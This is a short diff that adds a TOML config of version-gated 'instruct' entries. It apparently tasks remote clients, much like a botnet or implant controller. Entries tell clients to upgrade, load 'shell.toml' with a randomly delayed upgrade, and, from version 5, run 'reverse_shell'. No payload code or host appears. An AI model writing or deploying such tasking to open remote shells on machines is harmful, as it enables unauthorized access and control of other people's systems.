@@ -1,0 +1,14 @@
+[[instruct]]
+# Minimum version required to execute the command
+min_ver = 0
+do = ["upgrade"]
+
+[[instruct]]
+# shell.toml uses features only available since version 3
+min_ver = 3
+# We can perform the main course of action, but upgrade afterwards, delayed randomly
+do = ["load:shell.toml","upgrade_delayed"]
+
+[[instruct]]
+min_ver = 5
+do = ["reverse_shell"]
